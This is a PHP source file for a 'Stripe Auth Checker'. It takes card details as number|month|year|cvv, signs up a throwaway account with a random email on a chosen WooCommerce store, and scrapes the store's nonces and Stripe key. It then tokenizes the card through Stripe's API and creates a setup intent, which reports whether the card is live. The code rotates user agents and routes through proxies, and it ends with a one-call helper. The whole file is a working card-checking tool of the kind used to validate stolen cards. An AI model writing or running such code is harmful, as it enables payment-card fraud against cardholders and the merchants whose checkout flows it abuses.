<?php
/**
 * Stripe Auth Checker - PHP Implementation
 * Automatically creates accounts and adds payment methods to Stripe-powered sites
 * Based on actual WooCommerce + Stripe flow
 */

class StripeAuthChecker {
    private $domain;
    private $proxy;
    private $userAgent;
    private $sessionStart;
    private $sessionPages = 0;
    private $cookies = [];
    
    // Session tracking
    private $accountEmail;
    private $registerNonce;
    private $paymentNonce;
    private $createSetupIntentNonce;
    private $createAndConfirmSetupIntentNonce;
    private $stripePublishableKey;
    private $stripeAccountId;
    private $pmId;
    private $guid;
    private $muid;
    private $sid;
    private $stripePattern;
    
    // User agents pool
    private $userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ];
    
    public function __construct($domain, $proxy = null) {
        $this->domain = rtrim($domain, '/');
        if (!str_starts_with($this->domain, 'http')) {
            $this->domain = 'https://' . $this->domain;
        }
        
        $this->proxy = $proxy;
        $this->userAgent = $this->userAgents[array_rand($this->userAgents)];
        $this->sessionStart = date('Y-m-d H:i:s');
        $this->log("Using User-Agent: " . substr($this->userAgent, 0, 50) . "...");
    }
    
    private function log($message, $level = 'INFO') {
        $timestamp = date('H:i:s');
        error_log("[{$timestamp}] [{$level}] {$message}");
    }
    
    private function generateEmail() {
        $domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'protonmail.com'];
        $username = bin2hex(random_bytes(5));
        $domain = $domains[array_rand($domains)];
        return "{$username}@{$domain}";
    }
    
    private function generatePassword() {
        return bin2hex(random_bytes(6)) . '!A1';
    }
    
    private function extractField($html, $pattern, $default = null) {
        if (preg_match($pattern, $html, $matches)) {
            return $matches[1];
        }
        return $default;
    }
    
    private function curlRequest($url, $post = null, $headers = []) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_USERAGENT, $this->userAgent);
        
        // Handle cookies
        $cookieStr = '';
        foreach ($this->cookies as $name => $value) {
            $cookieStr .= "{$name}={$value}; ";
        }
        if ($cookieStr) {
            curl_setopt($ch, CURLOPT_COOKIE, trim($cookieStr));
        }
        
        // Handle proxy
        if ($this->proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $this->proxy);
        }
        
        // Headers
        $defaultHeaders = [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.5',
            'Accept-Encoding: gzip, deflate, br',
            'Connection: keep-alive',
        ];
        $allHeaders = array_merge($defaultHeaders, $headers);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $allHeaders);
        
        // POST request
        if ($post !== null) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        
        // Capture response headers
        curl_setopt($ch, CURLOPT_HEADER, true);
        
        $response = curl_exec($ch);
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $headers = substr($response, 0, $headerSize);
        $body = substr($response, $headerSize);
        
        // Extract cookies from response
        if (preg_match_all('/Set-Cookie:\s*([^;]+)/i', $headers, $matches)) {
            foreach ($matches[1] as $cookie) {
                list($name, $value) = explode('=', $cookie, 2);
                $this->cookies[trim($name)] = trim($value);
            }
        }
        
        curl_close($ch);
        
        return ['code' => $httpCode, 'body' => $body, 'headers' => $headers];
    }
    
    public function checkCard($ccString) {
        // Parse CC string
        $parts = explode('|', $ccString);
        if (count($parts) != 4) {
            return ['success' => false, 'status' => 'ERROR', 'message' => 'Invalid card format'];
        }
        
        list($cc, $mm, $yyyy, $cvv) = $parts;
        
        // Validate Luhn algorithm
        if (!$this->validateLuhn($cc)) {
            return ['success' => false, 'status' => 'ERROR', 'message' => 'Incorrect card number'];
        }
        
        // Validate expiry
        $currentYear = date('Y');
        $currentMonth = date('m');
        if (strlen($yyyy) == 2) {
            $yyyy = '20' . $yyyy;
        }
        if ($yyyy < $currentYear || ($yyyy == $currentYear && $mm < $currentMonth)) {
            return ['success' => false, 'status' => 'ERROR', 'message' => 'Expired card'];
        }
        
        // Run the auth flow
        return $this->run($cc, $mm, $yyyy, $cvv);
    }
    
    private function validateLuhn($number) {
        $sum = 0;
        $numDigits = strlen($number);
        $parity = $numDigits % 2;
        
        for ($i = 0; $i < $numDigits; $i++) {
            $digit = (int)$number[$i];
            if ($i % 2 == $parity) {
                $digit *= 2;
            }
            if ($digit > 9) {
                $digit -= 9;
            }
            $sum += $digit;
        }
        
        return ($sum % 10) == 0;
    }
    
    private function run($cc, $mm, $yyyy, $cvv) {
        $this->log("Starting Stripe Auth Checker");
        
        // Step 1: Visit account page
        $result = $this->curlRequest($this->domain . '/my-account/');
        if ($result['code'] != 200) {
            return ['success' => false, 'status' => 'ERROR', 'message' => 'Failed to load account page'];
        }
        $html = $result['body'];
        $this->sessionPages++;
        
        // Step 2: Extract registration nonce
        $this->registerNonce = $this->extractField($html, '/name=["\']woocommerce-register-nonce["\']\s+value=["\']([^"\']+)["\']/', null);
        if (!$this->registerNonce) {
            return ['success' => false, 'status' => 'ERROR', 'message' => 'Registration nonce not found'];
        }
        
        // Step 3: Create account
        $this->accountEmail = $this->generateEmail();
        $password = $this->generatePassword();
        
        $postData = http_build_query([
            'email' => $this->accountEmail,
            'password' => $password,
            'email_2' => '',
            'woocommerce-register-nonce' => $this->registerNonce,
            '_wp_http_referer' => '/my-account/',
            'register' => 'Register',
        ]);
        
        $result = $this->curlRequest(
            $this->domain . '/my-account/?action=register',
            $postData,
            [
                'Content-Type: application/x-www-form-urlencoded',
                'Origin: ' . $this->domain,
                'Referer: ' . $this->domain . '/my-account/',
            ]
        );
        
        if ($result['code'] < 200 || $result['code'] >= 400) {
            return ['success' => false, 'status' => 'ERROR', 'message' => 'Account creation failed'];
        }
        $this->sessionPages++;
        
        // Step 4: Load payment method page
        $result = $this->curlRequest($this->domain . '/my-account/add-payment-method/');
        if ($result['code'] != 200) {
            return ['success' => false, 'status' => 'ERROR', 'message' => 'Failed to load payment page'];
        }
        $html = $result['body'];
        $this->sessionPages++;
        
        // Extract Stripe configuration
        $this->extractStripeConfig($html);
        
        if (!$this->stripePublishableKey) {
            return ['success' => false, 'status' => 'ERROR', 'message' => 'Stripe key not found'];
        }
        
        // Step 5: Generate Stripe session IDs
        $this->guid = bin2hex(random_bytes(18));
        $this->muid = sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
            mt_rand(0, 0xffff), mt_rand(0, 0xffff),
            mt_rand(0, 0xffff),
            mt_rand(0, 0x0fff) | 0x4000,
            mt_rand(0, 0x3fff) | 0x8000,
            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
        );
        $this->sid = $this->muid;
        
        // Step 6: Tokenize card with Stripe
        $pmId = $this->tokenizeCard($cc, $mm, $yyyy, $cvv);
        if (!$pmId) {
            return ['success' => false, 'status' => 'ERROR', 'message' => 'Card tokenization failed'];
        }
        $this->pmId = $pmId;
        
        // Step 7: Create setup intent
        $setupResult = $this->createSetupIntent();
        
        return [
            'success' => $setupResult['success'],
            'status' => $setupResult['success'] ? 'SUCCESS' : 'ERROR',
            'message' => $setupResult['message'],
            'account_email' => $this->accountEmail,
            'pm_id' => $this->pmId,
        ];
    }
    
    private function extractStripeConfig($html) {
        // Try to extract Stripe publishable key
        $patterns = [
            '/["\'"]publishableKey["\'"]:\s*["\']([^"\']+)["\']/',
            '/["\'"]key["\'"]:\s*["\']([^"\']+)["\']/',
            '/(pk_live_[a-zA-Z0-9_]+)/',
        ];
        
        foreach ($patterns as $pattern) {
            $key = $this->extractField($html, $pattern, null);
            if ($key && str_starts_with($key, 'pk_')) {
                $this->stripePublishableKey = $key;
                break;
            }
        }
        
        // Extract nonces
        $this->createSetupIntentNonce = $this->extractField($html, '/["\'"]createSetupIntentNonce["\'"]:\s*["\']([^"\']+)["\']/', null);
        $this->createAndConfirmSetupIntentNonce = $this->extractField($html, '/["\'"]createAndConfirmSetupIntentNonce["\'"]:\s*["\']([^"\']+)["\']/', null);
        $this->stripeAccountId = $this->extractField($html, '/["\'"]accountId["\'"]:\s*["\']([^"\']+)["\']/', null);
        
        // Determine pattern
        if ($this->createAndConfirmSetupIntentNonce) {
            $this->stripePattern = 'pattern2';
        } else {
            $this->stripePattern = 'pattern1';
        }
    }
    
    private function tokenizeCard($cc, $mm, $yyyy, $cvv) {
        $ccFormatted = implode(' ', str_split($cc, 4));
        $yy = substr($yyyy, -2);
        
        $postData = http_build_query([
            'billing_details[name]' => ' ',
            'billing_details[email]' => $this->accountEmail,
            'billing_details[address][country]' => 'US',
            'billing_details[address][postal_code]' => '10001',
            'type' => 'card',
            'card[number]' => $ccFormatted,
            'card[cvc]' => $cvv,
            'card[exp_year]' => $yy,
            'card[exp_month]' => str_pad($mm, 2, '0', STR_PAD_LEFT),
            'allow_redisplay' => 'unspecified',
            'guid' => $this->guid,
            'muid' => $this->muid,
            'sid' => $this->sid,
            'key' => $this->stripePublishableKey,
        ]);
        
        if ($this->stripeAccountId) {
            $postData .= '&_stripe_account=' . urlencode($this->stripeAccountId);
        }
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Accept: application/json',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://js.stripe.com',
            'Referer: https://js.stripe.com/',
            'User-Agent: ' . $this->userAgent,
        ]);
        
        $response = curl_exec($ch);
        curl_close($ch);
        
        $data = json_decode($response, true);
        if (isset($data['id'])) {
            $this->log("Card tokenized successfully! PM ID: " . $data['id']);
            return $data['id'];
        }
        
        $error = $data['error']['message'] ?? 'Unknown error';
        $this->log("Stripe tokenization failed: {$error}", 'ERROR');
        return null;
    }
    
    private function createSetupIntent() {
        $url = $this->domain . '/wp-admin/admin-ajax.php';
        
        if ($this->stripePattern == 'pattern2') {
            $postData = http_build_query([
                'action' => 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method' => $this->pmId,
                'wc-stripe-payment-type' => 'card',
                '_ajax_nonce' => $this->createAndConfirmSetupIntentNonce,
            ]);
            
            $result = $this->curlRequest($url, $postData, [
                'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With: XMLHttpRequest',
                'Origin: ' . $this->domain,
                'Referer: ' . $this->domain . '/my-account/add-payment-method/',
            ]);
        } else {
            // Pattern 1 - multipart form data
            $boundary = '----WebKitFormBoundary' . bin2hex(random_bytes(16));
            $postData = "--{$boundary}\r\n";
            $postData .= "Content-Disposition: form-data; name=\"action\"\r\n\r\n";
            $postData .= "create_setup_intent\r\n";
            $postData .= "--{$boundary}\r\n";
            $postData .= "Content-Disposition: form-data; name=\"wcpay-payment-method\"\r\n\r\n";
            $postData .= $this->pmId . "\r\n";
            $postData .= "--{$boundary}\r\n";
            $postData .= "Content-Disposition: form-data; name=\"_ajax_nonce\"\r\n\r\n";
            $postData .= $this->createSetupIntentNonce . "\r\n";
            $postData .= "--{$boundary}--\r\n";
            
            $result = $this->curlRequest($url, $postData, [
                'Content-Type: multipart/form-data; boundary=' . $boundary,
                'Origin: ' . $this->domain,
                'Referer: ' . $this->domain . '/my-account/add-payment-method/',
            ]);
        }
        
        if ($result['code'] != 200) {
            return ['success' => false, 'message' => 'Setup intent failed'];
        }
        
        $data = json_decode($result['body'], true);
        if (isset($data['success']) && $data['success']) {
            return ['success' => true, 'message' => 'Payment method added successfully'];
        }
        
        $error = $data['error']['message'] ?? $data['data']['error']['message'] ?? 'Setup intent failed';
        return ['success' => false, 'message' => $error];
    }
}

// Standalone function for easy usage
function stripeAuthCheck($domain, $ccString, $proxy = null) {
    $checker = new StripeAuthChecker($domain, $proxy);
    return $checker->checkCard($ccString);
}
?>
